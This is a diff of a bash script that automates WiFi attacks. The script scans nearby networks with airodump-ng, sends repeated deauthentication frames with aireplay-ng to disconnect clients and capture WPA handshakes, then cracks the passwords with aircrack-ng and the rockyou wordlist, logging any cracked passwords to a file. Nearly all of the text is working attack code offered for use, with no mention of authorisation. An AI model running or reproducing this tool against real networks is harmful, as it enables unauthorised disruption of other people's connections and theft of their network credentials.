@@ -1,14 +1,10 @@
 #!/bin/bash
 
-# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path
+# version: 2.0 28/12/24 04:48
 
-
-# Fix:
-# for open network Don't scan again, just show the list again
 
 ### To Do ###
-# 
-# if finish the Aircrack rockyou without success than write it in the file. - And if I run the scan again tell me that rockyou not work and stop the script.
+# for scan again options, just show the list again instead of scan if its less than 1 min.
 # option to run all networks or range of them at the same time.
 # use GPU ?
 # use differenet methods than rockyou
@@ -20,8 +16,10 @@
 
 
 
+# **IMPORTANT** for Alfa AWUS036AXML wifi card don't run apt upgrade. or else the card won't work.
+# To enable 6Ghz run: sudo iw reg set US 
 
-
+# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path
 # ------------------------------
 # Variables
 # ------------------------------
@@ -110,7 +108,7 @@ function adapter_config() {
 # ------------------------------
 function network_scanner() {	
         # Scan 10 seconds for wifi networks    
-        sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng "$wifi_adapter"mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date        
+        sudo gnome-terminal --geometry=110x35-10000-10000 -- timeout 10s sudo airodump-ng --band abg "$wifi_adapter"mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date        
         countdown_duration=10
         echo -e "\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
 
@@ -127,7 +125,7 @@ function network_scanner() {
         awk '$4 != ""' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
         tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
         head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
-        #clear
+        clear
         echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"
         # Display the scan input file contents with row numbers
         printf "    Name: %-35s Encryption: %-6s Channel: %-5s BSSID: %-1s\n" 
@@ -192,27 +190,34 @@ function network_scanner() {
             another_scan_prompt
         fi
         
-# Add if password already exist than break!
 
-        # if the directory exist from previous scan then check if we already got handshake from previous scan
-        if [ -d $targets_path/"$bssid_name" ]; then
-            # Check if we capture the handshake - Before the attack:
-	    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
-	    	echo -e "\033[1;32mHandshake found from previous scan!\033[0m\n" 
-	        sudo pkill aireplay-ng
-	        sudo pkill airodump-ng
-	        echo
-	        echo --- >> $targets_path/wifi_passwords.txt
-	        printf "We got handshake for: %-30s (BSSID: %s) at %s\n" "$bssid_name" "$bssid_address" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
-	        dictionary_attack
-	        exit 1
-	    fi    
-	    #rm -r $targets_path/"$bssid_name"
+        # If the directory exists from a previous scan, then check if we already have handshake or password
+        if [ -d "$targets_path/$bssid_name" ]; then
+            # First, check if we already have the Wi-Fi password for this BSSID
+            if sudo grep -A1 "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt" | grep -q "The wifi password is:"; then
+                wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt" | grep "The wifi password is:" | awk -F': ' '{print $2}' | xargs)
+                echo -e "\033[1;32mPassword already exists for this network!\033[0m"
+                echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
+                exit 0
+            # If no password exists, check if we captured the handshake
+            elif sudo grep -q "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt"; then
+                echo -e "\033[1;32mHandshake found from previous scan!\033[0m\n"
+                sudo pkill aireplay-ng
+                sudo pkill airodump-ng
+                echo
+                echo --- >> "$targets_path/wifi_passwords.txt"
+                check_previous_failure  # Check if this BSSID was previously marked as failed
+                dictionary_attack
+                exit 1
+            else
+                rm -r $targets_path/"$bssid_name"    
+            fi            
         fi
+
         mkdir $targets_path/"$bssid_name"
 
         echo "Validating network:"
-        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
+        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
         #sleep 10
 
 	found=0
@@ -266,16 +271,13 @@ function devices_scanner() {
 # Deauth Attack  
 # ------------------------------
 function deauth_attack() {
-
 	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
 	    # trying 10 times (3 minutes) the deauth attack
 	    for ((i=1; i<=10; i++)); do        
-		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
-		
+		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
 		for target_device in $target_devices; do
 		    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
-		done
-		
+		done		
 		echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
 		echo -e "$target_devices" | tr ' ' '\n',
 		echo
@@ -288,7 +290,7 @@ function deauth_attack() {
 			sudo pkill airodump-ng
 			echo
 			echo --- >> $targets_path/wifi_passwords.txt
-			printf "We got handshake for: %-30s (BSSID: %s) at %s\n" "$bssid_name" "$bssid_address" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+			echo -e "We got handshake for ($bssid_address): $bssid_name                       at $(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
 			break 2
 		    fi    
 		done
@@ -309,21 +311,27 @@ function deauth_attack() {
 # Check Previous Attempts
 # ------------------------------
 function check_previous_failure() {
-    if grep -q "Password not found in rockyou.txt file for BSSID: $bssid_address" "$targets_path/wifi_passwords.txt"; then
-        echo -e "\033[1;31mPassword for BSSID: $bssid_address was already checked and not found in rockyou.txt file.\033[0m"
-        echo -e "\033[1;33mSkipping this network.\033[0m"
-        another_scan_prompt
+    if grep -A1 "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt" | grep -q "Password not found in rockyou.txt"; then
+        echo -e "\033[1;31mPassword for $bssid_name (BSSID: $bssid_address) was already checked and not found in rockyou.txt file.\033[0m"    
+        # Prompt the user
+        echo -e "\033[1;33mWould you like to try cracking the handshake again? (Y/n)\033[0m"
+        read -p "Enter your choice: " user_choice
+        if [[ "$user_choice" == "y" || "$user_choice" == "Y" ]]; then
+            echo -e "\n\033[1;32mContinuing to dictionary attack...\033[0m"
+            # Continue in dictionary_attack function
+        else
+            echo -e "\033[1;33mSkipping this network and proceeding to another scan.\033[0m"
+            another_scan_prompt
+        fi
     fi
 }
+
 
 
 # --------------------------------------------------
 # Dictionary Attack - Cracking the Password
 # --------------------------------------------------
 function dictionary_attack() {
-   	# Check if this BSSID was previously marked as failed
-  	check_previous_failure
-  	
 	echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
 	sudo aircrack-ng "$targets_path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$targets_path/$bssid_name/$bssid_name-wifi_password.txt"
 	echo
@@ -335,7 +343,7 @@ function dictionary_attack() {
 	    exit 1
 	else
 	    echo -e "\nCouldn't finf a match from rockyou wordlist.."
-	    printf "Password not found in rockyou.txt file for BSSID: %-30s at %s\n" "$bssid_address" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+	    echo -e "Password not found in rockyou.txt" >> "$targets_path/wifi_passwords.txt"
 	    another_scan_prompt
 	fi
 }
